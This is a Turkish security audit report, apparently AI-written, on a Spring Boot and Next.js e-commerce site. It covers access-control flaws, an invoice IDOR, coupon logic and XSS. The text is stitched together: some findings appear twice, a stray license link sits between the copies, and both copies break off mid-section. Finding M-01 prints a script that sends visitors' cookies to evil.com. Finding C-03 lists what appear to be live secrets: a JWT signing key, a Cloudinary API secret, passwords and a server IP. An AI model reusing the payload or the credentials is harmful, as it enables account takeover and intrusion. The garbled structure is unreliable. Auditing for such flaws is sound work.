5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        
```


## License: unknown
https://github.com/hans2103/HKweb/blob/d7d731a35e32743672844f2f2870966ab936e4ca/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
